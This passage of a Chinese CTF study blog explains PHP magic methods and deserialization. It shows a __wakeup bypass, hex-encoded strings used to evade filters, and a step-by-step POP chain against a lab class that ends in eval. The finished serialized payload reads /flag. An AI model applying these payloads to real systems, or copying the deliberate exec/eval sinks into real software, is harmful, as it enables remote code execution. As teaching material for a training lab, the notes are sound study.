&quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;一&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;五&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;！&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A: &quot;</span> . <span class="variable language_">$this</span>-&gt;a . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;B: &quot;</span> . <span class="variable language_">$this</span>-&gt;b . <span class="string">&quot;\n&quot;</span> .</span><br><span class="line">            <span class="string">&quot;C: &quot;</span> . <span class="variable language_">$this</span>-&gt;c . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>(<span class="string">&quot;我是&quot;</span>, <span class="string">&quot;理塘&quot;</span>, <span class="string">&quot;丁真&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getAll</span>();</span><br></pre></td></tr></table></figure>

<p>这将输出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A: 我是</span><br><span class="line">B: 理塘</span><br><span class="line">C: 丁真</span><br><span class="line">A: 一</span><br><span class="line">B: 五</span><br><span class="line">C: ！</span><br></pre></td></tr></table></figure>

<p>在这里相当于在程序执行至 28 行时，添一行 29 行，执行析构函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>: <span class="comment">// 销毁$a对应的Example对象，触发__destruct()</span></span><br></pre></td></tr></table></figure>

<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote>
<p>当使用 unserialize 时先被调用，可用于做些对象的初始化操作（unserialize 触发）</p>
</blockquote>
<p>继续修改上面的代码，我们添加一个 <code>__wakeup()</code> 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function __wakeup()&#123;//  实际开发别这样写    exec($this-&gt;oneFive);&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们没有对 <code>__construct</code> 中的 <code>$oneFive</code> 变量做过滤的话，<code>unserialize</code> 在执行完后时会自动调用 <code>__wakeup()</code> 的，所以 <code>__wakeup()</code> 一般在赛场上做过滤（可以绕过），实际开发应该用于对象反序列化后对其状态进行恢复</p>
<p><img src="/images/ZHrZbZBsyoXcr4x9A6bcQTE1nWd.png"></p>
<p>接下来我们在 <code>__wakeup()</code> 里加入一些过滤方法，来看看怎么利用 <code>__wakeup()</code> 函数失效来绕过这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DingZhen</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oneFive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$oneFive</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;oneFive = <span class="variable">$oneFive</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;oneFive) . <span class="string">&quot;: I got smoke.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//  实际开发别这样写</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\b(exec|system)\b/i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$this</span>-&gt;oneFive))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;oneFive;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将序列化后的数据的参数数量 +1 即可</p>
<p><img src="/images/YXb3bWlnhoIvmIxEOyRc5fB4nVc.png"></p>
<p>加了 1 后，正常运行</p>
<p><img src="/images/CoXvb2HMyo3kcexkOW2cyTegnNc.png"></p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。（serialize）<br>注意：__sleep() 只能返回数组</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;data = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<h4 id="destruct-1"><a href="#destruct-1" class="headerlink" title="__destruct()"></a>__destruct()</h4><blockquote>
<p>__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DingZhen</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$oneFive</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$oneFive</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;oneFive = <span class="variable">$oneFive</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">DingZhen</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">session1</span>();</span><br></pre></td></tr></table></figure>

<p>脚本执行到末尾，程序结束，在本作用域的生命周期结束，被 PHP 自动销毁，触发 <code>__destruct()</code>，输出 <code>Done!</code>。</p>
<p><img src="/images/FInjbCfZeoD0fcxOl3qc2Ie0nsg.png"></p>
<p><em>注意:用__unset()<strong>主动释放变量，或__变量被覆盖</strong>（失去对原对象的引用），对象也立即被销毁</em></p>
<p><em>其中:__“变量被覆盖” _<em>是指</em><strong>变量指向的对象 &#x2F; 数据类型发生改变</strong>_（比如从 “对象” 变成 “整数”），而 “变量内部属性赋值” 只是修改对象的内容，变量仍然引用原对象，不会触发销毁。</em></p>
<p><img src="/images/W1W0bEvMvoseLAxhB4Hc4ksfnSd.png"></p>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote>
<p>方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:7:&quot;Example&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>;        <span class="comment">// 注意这里</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;        <span class="comment">// 注意这里</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Y16MbaAGMo10Q5xbH8yc3weWnag.png"></p>
<p>注意 phpinfo()函数是你在执行 phpinfo()函数时作为执行结果显示在第一行的，实际上只执行了一次 echo 输出</p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><blockquote>
<p>当尝试以调用函数的方式调用一个对象时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a> 方法会被自动调用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =  <span class="string">&#x27;O:7:&quot;Example&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>();</span><br></pre></td></tr></table></figure>

<p>直接执行 phpinfo(),函数自己会输出</p>
<p><img src="/images/ZtyBbZ7X2oWCJBxpjyOclZsXnlh.png"></p>
<h4 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a>__call() 和 __callStatic()</h4><blockquote>
<p>在对象中调用一个不可访问方法时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a> 会被调用。<br>在静态上下文中调用一个不可访问方法时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a> 会被调用。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling object method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">            . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling static method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">            . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">fuck</span>(<span class="string">&#x27;me&#x27;</span>);</span><br><span class="line"><span class="title class_">Example</span>::<span class="title function_ invoke__">mother</span>(<span class="string">&#x27;fuck&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>不可访问方法</strong><em>：包括「方法不存在」（类里没定义）、「方法权限不够」（比如 private 方法被外部调用）；</em></p>
<p><strong>静态上下文</strong><em>：调用方法时用__类名::方法名()__，或方法被__static__修饰。</em></p>
<p><em>静态方法__能够不用以已有对象为根基</em><em>，直接调用(类名::函数名)即可</em></p>
<h4 id="属性重载"><a href="#属性重载" class="headerlink" title="属性重载"></a>属性重载</h4><ul>
<li>在给不可访问（protected 或 private）或不存在的属性赋值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> 会被调用。</li>
<li>读取不可访问（protected 或 private）或不存在的属性的值时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> 会被调用。</li>
<li>当对不可访问（protected 或 private）或不存在的属性调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.isset.php">isset()</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.empty.php">empty()</a> 时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> 会被调用。</li>
<li>当对不可访问（protected 或 private）或不存在的属性调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unset.php">unset()</a> 时，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> 会被调用。</li>
</ul>
<h2 id="基础漏洞举例"><a href="#基础漏洞举例" class="headerlink" title="基础漏洞举例"></a>基础漏洞举例</h2><h3 id="反序列化靶场-Level4-初体验"><a href="#反序列化靶场-Level4-初体验" class="headerlink" title="*[反序列化靶场]Level4-初体验"></a>*[反序列化靶场]Level4-初体验</h3><p>「嗯！？全是私有，怎么获取 flag 呢？试试序列化！ 」</p>
<p>读题,类 flag 里面有一个 string 一个 number 和一个嵌套类 object</p>
<p>全是私有，但我们想要得到 flag，必然要清楚这些值是什么</p>
<p>那么还有一种访问变量的方式，就是将其序列化</p>
<p><img src="/images/HekjbvMf7oNvd6xQk93cOs3Kn4g.png"></p>
<p>我们用 post 提交 code&#x3D;<code>echo serialize($flag_is_here);</code> 返回了这么一大串</p>
<p><img src="/images/VWQObHi1No0iIZxRBVvcM4axntb.png"></p>
<p>大概可以读明白 flag1 到 3，3 还是个数组，一共是四个碎片，把他拼接成 flag 即可</p>
<p>flag{ser4l1ze2se3me}</p>
<p><em>第七周的任务至此完成了一半，进度还差大部队半周左右，在慢慢跟上…</em></p>
<h1 id="Week7-3-反序列化漏洞利用"><a href="#Week7-3-反序列化漏洞利用" class="headerlink" title="[Week7.3]反序列化漏洞利用"></a>[Week7.3]反序列化漏洞利用</h1><p><em>注:反序列化靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="POP-链构造"><a href="#POP-链构造" class="headerlink" title="POP 链构造"></a>POP 链构造</h2><h3 id="POP-链概论"><a href="#POP-链概论" class="headerlink" title="POP 链概论"></a>POP 链概论</h3><p>前两节所学可能出现的漏洞，都是基于 “ 自动调用 “ 的 magic function。但当漏洞&#x2F;危险代码存在类的普通方法中，就不能指望通过 “ 自动调用 “  来达到目的了。这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>
<p>这时候就得换个思路：去代码里找有没有函数名一样的方法，把藏着危险代码的普通方法和其他类（尤其是有魔术方法的类）给串起来。( <strong>在所有类的代码里，找名称完全相同的方法（比如 A 类有<strong><strong>exec()</strong></strong>，B 类也有<strong><strong>exec()</strong></strong>），用这个 “同名方法” 当桥梁，把不同类串起来触发危险代码</strong>。)一般做代码审计的时候，我们都会重点盯着这些危险代码，一层一层往上找能触发它的方法，最后拼出一个能真正搞事情的 payload。</p>
<h3 id="使用大写-S-支持字符串编码"><a href="#使用大写-S-支持字符串编码" class="headerlink" title="使用大写 S 支持字符串编码"></a>使用大写 S 支持字符串编码</h3><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>
<p><code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code></p>
<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>
<p><img src="/images/TF8kbX4hJo42z9x9k1gcfzdInMe.png"></p>
<h3 id="构造举例"><a href="#构造举例" class="headerlink" title="构造举例"></a>构造举例</h3><p>假设审计时看到以下代码（这是靶场常见的 POP 链场景）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 类A：有自动触发的魔术方法（POP链起点）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>; <span class="comment">// 存储另一个类的实例</span></span><br><span class="line">    <span class="comment">// 魔术方法：反序列化时自动调用（固定起点）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">run</span>(); <span class="comment">// 调用$b的run()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类B：中间类（承上启下）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>; <span class="comment">// 存储另一个类的实例</span></span><br><span class="line">    <span class="comment">// 普通方法：需要被调用才执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">exec</span>(); <span class="comment">// 调用$c的exec()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类C：有危险代码的类（POP链终点）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>; <span class="comment">// 存储要执行的命令</span></span><br><span class="line">    <span class="comment">// 普通方法：藏着危险代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); <span class="comment">// 执行任意代码（核心目标）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化入口（靶场的触发点）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们的目标：构造一个 payload，让 eval($this-&gt;cmd)执行我们想要的命令（比如 phpinfo();或 echo file_get_contents(‘&#x2F;flag’);）</p>
<p>思考一下 ABC 对象三者的 POP 链关系，按步骤操作构造 POP 链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反序列化payload → 触发A::__wakeup()（自动） </span><br><span class="line">→ A::__wakeup()调用B::run()（因为$b是B的实例）</span><br><span class="line">→ B::run()调用C::exec()（因为$c是C的实例）</span><br><span class="line">→ C::exec()执行eval($cmd)（危险代码）</span><br></pre></td></tr></table></figure>

<p><strong>步骤 1：实例化所有需要的类</strong></p>
<p>先创建 A、B、C 的实例，这是构造 payload 的基础：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建各个类的实例</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(); <span class="comment">// 起点类（有魔术方法）</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(); <span class="comment">// 中间类（承上启下）</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(); <span class="comment">// 终点类（有危险代码）</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 2：把实例 “串” 起来（核心：属性赋值）</strong></p>
<p>通过给类的公共属性赋值，让不同类的实例产生关联：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 2. 串链路：A→B→C</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$b</span>; // 让A的<span class="variable">$b</span>属性指向B的实例（这样A::__wakeup()能调用B::run()）</span><br><span class="line"><span class="variable">$b</span>-&gt;c = <span class="variable">$c</span>; // 让B的<span class="variable">$c</span>属性指向C的实例（这样B::run()能调用C::<span class="built_in">exec</span>()）</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3：给危险代码传参（告诉代码要执行什么命令）</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 传入恶意命令（比如读flag）</span></span><br><span class="line"><span class="variable">$c</span>-&gt;cmd = <span class="string">&quot;echo file_get_contents(&#x27;/flag&#x27;);&quot;</span>; </span><br><span class="line"><span class="comment">// 测试用：也可以写phpinfo(); 先验证是否能执行</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 4：序列化得到最终 payload</strong></p>
<p><img src="/images/GhZfb0svvoZ1pXxwzQUcjejOnjc.png"></p>
<p>O:1:”A”:1:{s:1:”b”;O:1:”B”:1:{s:1:”c”;O:1:”C”:1:{s:3:”cmd”;s:31:”echo file_get_contents(‘&#x2F;flag’);”;}}}</p>
<p>我们也可以新建 php 文件，复制各类内容，用 php 脚本构造 payload</p>
